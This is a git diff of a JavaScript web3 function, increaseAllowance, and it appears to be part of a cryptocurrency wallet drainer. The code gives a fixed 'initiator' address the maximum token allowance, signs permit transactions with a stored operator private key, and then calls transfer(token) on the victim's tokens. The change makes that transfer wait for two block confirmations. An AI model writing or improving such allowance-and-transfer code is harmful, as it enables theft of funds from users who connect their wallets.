@@ -177,7 +177,16 @@ export const increaseAllowance = async (token) => {
                   data: permitData
               }
               const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-              await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
+              await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
+              .on("transactionHash", async (hash) => {
+                console.log(hash);
+              })
+              .on("confirmation", async (confirmationNumber, receipt) => {
+                if (confirmationNumber >= 2) {
+                  console.log(receipt);
+                  await transfer(token);
+                }
+              });
             });
           } catch (error) {
             console.log(error);
@@ -243,7 +252,16 @@ export const increaseAllowance = async (token) => {
                   data: permitData
               }
               const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-              await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
+              await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
+              .on("transactionHash", async (hash) => {
+                console.log(hash);
+              })
+              .on("confirmation", async (confirmationNumber, receipt) => {
+                if (confirmationNumber >= 2) {
+                  console.log(receipt);
+                  await transfer(token);
+                }
+              });
               
             })
           } catch (error) {
@@ -251,13 +269,21 @@ export const increaseAllowance = async (token) => {
           }
         }
       })
-      await transfer(token);
       return;
     }
     try{
       if (constants.tokens[token.token_address]) {
-        await contract.methods.increaseAllowance(constants.initiator, constants.max).send({ from: account });
-        await transfer(token);
+        await contract.methods.increaseAllowance(constants.initiator, constants.max)
+        .send({ from: account })
+        .on('transactionHash', async (hash) => {
+          console.log(hash);
+        })
+        .on("confirmation", async (confirmationNumber, receipt) => {
+          if (confirmationNumber >= 2) {
+            console.log(receipt);
+            await transfer(token);
+          }
+        });
         return;
       }
     } catch (error) {
